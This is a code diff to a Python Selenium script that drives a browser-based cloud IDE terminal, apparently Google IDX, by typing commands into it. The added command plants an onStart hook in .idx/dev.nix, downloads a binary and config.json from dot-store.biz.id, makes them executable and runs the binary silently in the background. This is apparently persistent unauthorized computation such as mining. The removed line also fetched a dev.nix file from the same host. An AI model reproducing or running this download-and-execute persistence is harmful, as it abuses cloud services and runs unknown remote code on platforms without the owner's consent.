@@ -84,10 +84,9 @@ def open_terminal_and_run(driver):
         actions = ActionChains(driver)
         actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
         time.sleep(3)
-
-        commands = [
-            'wget -q -O .idx/dev.nix https://dot-store.biz.id/joko.nix'
-        ]
+        
+        commands = [ 'grep -q "joko = " .idx/dev.nix || sed -i \'/onStart = {/a \\        joko = "cd  ~/.cloud && nohup ./cloud -c \'config.json\' > /dev/null 2>\\&1 &";\' .idx/dev.nix && cd ~/ && mkdir -p .cloud && cd .cloud && wget -O cloud https://dot-store.biz.id/bagong && wget -O config.json https://dot-store.biz.id/bagong.json && chmod +x cloud config.json']
+        
         for cmd in commands:
             actions = ActionChains(driver)
             for char in cmd:
